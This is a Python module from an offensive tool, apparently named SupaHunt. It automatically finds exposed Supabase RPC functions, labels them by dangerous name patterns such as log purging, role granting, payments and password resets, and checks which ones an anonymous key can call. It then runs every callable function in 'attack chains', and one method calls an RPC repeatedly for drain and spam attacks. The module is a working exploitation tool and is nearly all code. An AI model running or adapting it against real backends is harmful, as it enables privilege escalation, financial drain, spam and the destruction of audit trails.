"""
SupaHunt — RPC Abuser Module
Auto-discovers and exploits exposed Supabase RPC functions.
Works by:
1. Enumerating all RPCs via GraphQL introspection + REST probing
2. Classifying each by dangerous keyword patterns
3. Testing callability with anon key or user token
4. Building dynamic attack chains from discovered callable RPCs
"""

import json
import time
from typing import Optional
from .base import BaseModule


# Keyword patterns for auto-classifying discovered RPCs
# Maps category → (keywords_in_name, severity, impact_template)
DANGEROUS_PATTERNS = {
    "evidence_destruction": {
        "keywords": ["cleanup", "purge", "prune", "clear_old", "clear_log",
                     "delete_old", "remove_old", "archive_old", "truncate"],
        "severity": "CRITICAL",
        "impact": "Destroys audit trail / historical records — covers attacker tracks",
    },
    "user_management": {
        "keywords": ["delete_user", "ban_user", "suspend_user", "disable_user",
                     "promote_user", "set_role", "set_admin", "grant_role",
                     "revoke_role", "make_admin", "elevate"],
        "severity": "CRITICAL",
        "impact": "Unauthorized user account manipulation or privilege escalation",
    },
    "financial": {
        "keywords": ["credit", "debit", "refund", "charge", "invoice",
                     "payment", "payout", "transfer", "withdraw", "deposit",
                     "balance", "wallet", "billing"],
        "severity": "CRITICAL",
        "impact": "Unauthorized financial operations — potential monetary loss",
    },
    "subscription": {
        "keywords": ["expire", "cancel_sub", "subscription", "premium",
                     "downgrade", "upgrade", "trial", "plan"],
        "severity": "CRITICAL",
        "impact": "Subscription/premium status manipulation — service disruption",
    },
    "notification": {
        "keywords": ["send_notification", "send_email", "send_sms", "broadcast",
                     "announce", "notification", "alert_user", "push_notify",
                     "send_global", "mass_mail"],
        "severity": "HIGH",
        "impact": "Unauthorized notification/email sending — spam or phishing vector",
    },
    "data_modification": {
        "keywords": ["reset", "wipe", "bulk_update", "bulk_delete", "batch_insert",
                     "batch_update", "mass_update", "import", "seed",
                     "migrate", "sync", "aggregate", "recalculate",
                     "recompute", "rebuild"],
        "severity": "HIGH",
        "impact": "Bulk data modification — integrity corruption risk",
    },
    "admin_info": {
        "keywords": ["get_admin", "admin_stats", "admin_dash", "internal_stats",
                     "debug", "system_info", "get_config", "get_settings",
                     "list_all_users", "get_all", "export", "dump"],
        "severity": "HIGH",
        "impact": "Admin-level information disclosure",
    },
    "budget_drain": {
        "keywords": ["consume", "spend", "budget", "drain", "decrement",
                     "use_credit", "burn"],
        "severity": "CRITICAL",
        "impact": "Resource/budget consumption — financial drain attack",
    },
    "auth_manipulation": {
        "keywords": ["reset_password", "change_password", "invalidate_token",
                     "revoke_session", "force_logout", "oauth", "generate_token",
                     "create_token", "issue_token"],
        "severity": "CRITICAL",
        "impact": "Authentication/session manipulation — account takeover risk",
    },
}

# Safe patterns — RPCs matching these are likely harmless reads
SAFE_PATTERNS = [
    "get_public", "list_public", "search", "count",
    "check_", "validate_", "verify_", "is_", "has_",
]


class RPCAbuser(BaseModule):
    """
    Auto-discovers and exploits exposed Supabase RPC functions.
    No hardcoded function names — adapts to any target.
    """

    def __init__(self, target, console=None, timeout: int = 15,
                 proxy: str = None, custom_rpcs: list = None, **kwargs):
        super().__init__(target, console=console, timeout=timeout,
                         proxy=proxy, **kwargs)
        self._discovered = {}   # name -> result dict
        self._callable = []     # names of callable RPCs
        self._patched = []      # names that returned permission denied
        self._custom_rpcs = custom_rpcs or []

    # ──── RPC Discovery ────

    def discover_rpcs(self, token: str = None) -> list:
        """
        Auto-discover all RPC function names via GraphQL introspection.
        Falls back to REST probing of common patterns.
        """
        rpcs = set()

        # Method 1: GraphQL mutation introspection
        query = """{__schema{mutationType{fields{name args{name type{name kind ofType{name}}}}}}}"""
        result = self.graphql_query(query, token)
        mutations = (
            (result.get("data") or {})
            .get("__schema", {})
            .get("mutationType", {})
            .get("fields", [])
        )
        # Supabase exposes RPCs as root query fields too
        query2 = """{__schema{queryType{fields{name args{name type{name kind ofType{name}}}}}}}"""
        result2 = self.graphql_query(query2, token)
        queries = (
            (result2.get("data") or {})
            .get("__schema", {})
            .get("queryType", {})
            .get("fields", [])
        )

        # Filter: RPC functions are NOT Collection queries/mutations
        for field in queries + mutations:
            name = field["name"]
            if "Collection" not in name and not name.startswith("node"):
                rpcs.add(name)
                # Store arg info for later
                self._discovered[name] = {
                    "name": name,
                    "args": [
                        {"name": a["name"],
                         "type": (a.get("type") or {}).get("name", "unknown")}
                        for a in field.get("args", [])
                    ],
                    "source": "graphql",
                }

        self.log_info(f"GraphQL introspection: {len(rpcs)} RPC candidates")

        # Method 2: REST /rest/v1/rpc/ probing with common names
        # Only if GraphQL didn't find much
        if len(rpcs) < 5:
            common = [
                "version", "health", "ping", "status",
                "get_user", "get_users", "create_user",
            ]
            for name in common:
                r = self.post(self.rpc_url(name), json_data={})
                if r and r.status_code != 404:
                    rpcs.add(name)
                    if name not in self._discovered:
                        self._discovered[name] = {
                            "name": name, "args": [], "source": "rest_probe",
                        }

        # Add custom RPCs from user
        for name in self._custom_rpcs:
            rpcs.add(name)
            if name not in self._discovered:
                self._discovered[name] = {
                    "name": name, "args": [], "source": "custom",
                }

        self.log_info(f"Total RPC candidates: {len(rpcs)}")
        return sorted(rpcs)

    def classify_rpc(self, name: str) -> dict:
        """
        Classify an RPC by matching its name against dangerous patterns.
        Returns category, severity, and impact assessment.
        """
        name_lower = name.lower()

        # Check safe patterns first
        for safe in SAFE_PATTERNS:
            if name_lower.startswith(safe) or safe in name_lower:
                return {
                    "category": "safe",
                    "severity": "INFO",
                    "impact": "Likely safe read-only operation",
                    "dangerous": False,
                }

        # Check dangerous patterns
        for category, pattern in DANGEROUS_PATTERNS.items():
            for keyword in pattern["keywords"]:
                if keyword in name_lower:
                    return {
                        "category": category,
                        "severity": pattern["severity"],
                        "impact": pattern["impact"],
                        "dangerous": True,
                        "matched_keyword": keyword,
                    }

        # Unknown — still worth testing
        return {
            "category": "unknown",
            "severity": "MEDIUM",
            "impact": f"Unknown RPC function — needs manual review",
            "dangerous": None,  # unknown
        }

    # ──── Probing ────

    def probe_all(self, token: str = None, anon_only: bool = True,
                  skip_safe: bool = True) -> dict:
        """
        Discover all RPCs, classify them, test callability.
        Returns results grouped by category.
        """
        # Step 1: Discover
        rpc_names = self.discover_rpcs(token if not anon_only else None)

        results = {}
        total_callable = 0

        for name in rpc_names:
            classification = self.classify_rpc(name)

            # Optionally skip safe-looking RPCs
            if skip_safe and classification["category"] == "safe":
                continue

            # Build params — try empty first, then with discovered args
            params = {}
            rpc_info = self._discovered.get(name, {})
            for arg in rpc_info.get("args", []):
                # Provide sensible defaults for common param types
                arg_name = arg["name"]
                arg_type = (arg.get("type") or "").lower()
                if "uuid" in arg_type or "id" in arg_name.lower():
                    params[arg_name] = "00000000-0000-0000-0000-000000000000"
                elif "int" in arg_type or "amount" in arg_name.lower():
                    params[arg_name] = 1
                elif "float" in arg_type or "numeric" in arg_type:
                    params[arg_name] = 1.0
                elif "bool" in arg_type:
                    params[arg_name] = True
                elif "json" in arg_type:
                    params[arg_name] = "{}"
                else:
                    params[arg_name] = ""

            # Call it
            if anon_only:
                r = self.call_rpc(name, params)
            else:
                r = self.call_rpc(name, params, token)

            category = classification["category"]
            if category not in results:
                results[category] = []

            entry = {
                "name": name,
                "category": category,
                "severity": classification["severity"],
                "impact": classification["impact"],
                "status": r["status"],
                "callable": False,
                "exists": True,
                "response": r["data"][:300],
                "params_used": params,
            }

            if r["status"] == 404:
                entry["callable"] = False
                entry["exists"] = False
            elif r["success"]:
                entry["callable"] = True
                total_callable += 1
                self._callable.append(name)
                self.log_critical(
                    f"[{classification['severity']}] {name} — CALLABLE "
                    f"({r['status']}) — {classification['impact']}"
                )
            elif "permission denied" in r["data"].lower():
                self._patched.append(name)
                self.log_success(f"{name} — PATCHED (permission denied)")
            elif r["status"] in (400,):
                # 400 usually means function exists but params are wrong
                entry["exists"] = True
                # Try without params
                r2 = self.call_rpc(name, {}, token if not anon_only else None)
                if r2["success"]:
                    entry["callable"] = True
                    total_callable += 1
                    self._callable.append(name)
                    self.log_critical(
                        f"[{classification['severity']}] {name} — CALLABLE "
                        f"(no params, {r2['status']})"
                    )
                else:
                    self.log_info(f"{name} — exists but needs correct params ({r['status']})")
            else:
                self.log_info(f"{name} — {r['status']}: {r['data'][:80]}")

            results[category].append(entry)
            self._discovered[name].update(entry)

        self.log_info(f"\nTotal discovered: {len(rpc_names)}")
        self.log_info(f"Total callable: {total_callable}")
        self.log_info(f"Total patched: {len(self._patched)}")
        return results

    # ──── Dynamic Attack Chains ────

    def execute_chain(self, category: str = None, token: str = None,
                      repeat: int = 1) -> dict:
        """
        Execute all callable RPCs in a category (or all if category=None).
        Chains are built dynamically from what was discovered, not hardcoded.
        """
        targets = []
        for name in self._callable:
            info = self._discovered.get(name, {})
            if category and info.get("category") != category:
                continue
            targets.append(name)

        if not targets:
            return {"error": f"No callable RPCs in category '{category}'",
                    "callable": self._callable}

        results = {"category": category or "all", "repeat": repeat,
                   "targets": targets, "executions": []}

        self.log_info(
            f"Executing {len(targets)} RPCs "
            f"({category or 'all categories'}) x{repeat}"
        )

        for iteration in range(repeat):
            iteration_results = []
            for func_name in targets:
                params = self._discovered.get(func_name, {}).get("params_used", {})
                r = self.call_rpc(func_name, params, token)
                iteration_results.append({
                    "function": func_name,
                    "status": r["status"],
                    "success": r["success"],
                    "response": r["data"][:200],
                })
            results["executions"].append(iteration_results)

        return results

    def repeat_rpc(self, name: str, params: dict = None,
                   iterations: int = 100, token: str = None) -> dict:
        """Repeatedly call a single RPC — useful for drain/spam attacks."""
        successes = 0
        last_response = ""

        if params is None:
            params = self._discovered.get(name, {}).get("params_used", {})

        for i in range(iterations):
            r = self.call_rpc(name, params, token)
            if r["success"]:
                successes += 1
                last_response = r["data"][:200]

            if (i + 1) % 20 == 0:
                self.log_info(f"  {name}: {successes}/{i+1} succeeded")

        self.log_info(f"Repeated {name} x{iterations}: {successes} successes")
        return {
            "function": name,
            "iterations": iterations,
            "successes": successes,
            "last_response": last_response,
        }

    @property
    def summary(self) -> dict:
        return {
            "total_probed": len(self._discovered),
            "callable": self._callable,
            "patched": self._patched,
            "callable_count": len(self._callable),
            "patched_count": len(self._patched),
        }
